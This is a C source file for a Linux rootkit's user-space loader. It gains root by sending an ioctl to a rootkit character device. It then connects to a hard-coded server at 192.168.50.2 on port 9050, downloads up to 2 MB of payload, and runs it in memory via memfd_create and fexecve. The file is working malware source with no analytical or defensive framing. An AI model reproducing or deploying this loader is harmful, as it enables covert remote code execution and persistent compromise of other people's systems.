/*
    * This file contains code to receive a binary code (using anonymous files) and execute it with root permissions.
    * This reflective loader is embedded as a binary in the kernel module, 
        *  which then executes it in user space.
    * 
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <arpa/inet.h> // inet_addr()
#include <netdb.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <unistd.h>
#include <time.h>

#pragma message ("Compiling: "__FILE__)

#define MFD_CLOEXEC		0x0001U

#define BUFFER_SIZE  1024*1024*2  //2MB Buffer 2097152 Bytes

#define CHAR_DEVICE_PATH "/dev/root"
#define SERVER_PORT 9050
#define SERVER_IP "192.168.50.2"


/* IOCTL */
#define ROOTKIT_MAGIC 'R'
#define MAKE_ME_ROOT_NO 0x01
#define MAKE_ME_ROOT _IO(ROOTKIT_MAGIC, MAKE_ME_ROOT_NO)

int checkRoot(void){
    int me = getuid();
    int myprivs = geteuid();
    int ret = 0;
    if (me == myprivs){
        ret = 0;
    }
    else{
        ret = 1;
    }
    return ret;
}

int makeRoot()
{
    int fd;
    fd = open(CHAR_DEVICE_PATH, O_RDWR);
    if (fd < 0){
        return 1;
    }
    /* ioctl to make me root */
    ioctl(fd, MAKE_ME_ROOT);
    close(fd);
    return 0;
}

void delay(int number_of_seconds)
{
    // Converting time into milli_seconds
    int milli_seconds = 1000 * number_of_seconds;
    // Storing start time
    clock_t start_time = clock();
    // looping till required time is not achieved
    while(clock() < start_time + milli_seconds);
}

void toMenAndExe(char *data,int size){
    /*https://manpages.ubuntu.com/manpages/focal/en/man2/memfd_create.2.html*/
    /*https://man7.org/linux/man-pages/man2/memfd_create.2.html*/
    int fd_mem = memfd_create("Test", MFD_CLOEXEC);
    int writed = write(fd_mem,data,size);
    //printf("Bytes written % d\n",writed);

    char* argv[] = { "payload", "param1", NULL };
    char* envp[] = { "some", "environment", NULL };
    int x = fexecve(fd_mem, argv, envp);
    printf("fexecv % d\n", (x));
    //fexecve(fd_mem, NULL, NULL);
    close(fd_mem);
    
}

int main(){
    /*
    if(makeRoot()){
        return 0;
    }
    if(checkRoot() == 0){
        return 0;
    }
    */

   pid_t pid;
   pid = fork();
   if(pid){
    return 2;
   }
   else{
    int sockfd, connfd;
    struct sockaddr_in servaddr, cli;

     // socket create and verification
    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd == -1) {
        //printf("Socket error\n");
        exit(0);
        //return(-50);
    }
    else{//printf("Socket successfully created..\n");
    }

    bzero(&servaddr, sizeof(servaddr));
    /* Assign IP, PORT */
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(SERVER_IP);
    servaddr.sin_port = htons(SERVER_PORT);

    /* Connect the client socket to server socket */
    while (connect(sockfd, &servaddr, sizeof(servaddr))
        != 0) {
        //printf("connection with the server failed...\n");
        delay(1000);
        //exit(0);
    }
    //printf("connected to the server..\n");

    char *buff;
    buff = (char*) malloc(BUFFER_SIZE*sizeof(char));

    int bytes_read = 0;
    int totalBytesRead = 0;
    do{
        /* 
            *Always send a payload of less than 2 Megabytes, since the buffer is never checked for overflows 
        */
        bytes_read = recv(sockfd, (buff+totalBytesRead), BUFFER_SIZE-totalBytesRead, 0);
        //printf("Bytes leidos % d\n",bytes_read);
        totalBytesRead = totalBytesRead+bytes_read;
    }while(bytes_read!=0);

    //printf("Total bytes leidos % d  Restante en el buffer: %d\n",totalBytesRead,BUFFER_SIZE-totalBytesRead);
    toMenAndExe(buff,totalBytesRead); /* Run payload */
 
    // close the socket
    close(sockfd);
    return 0;
   }


}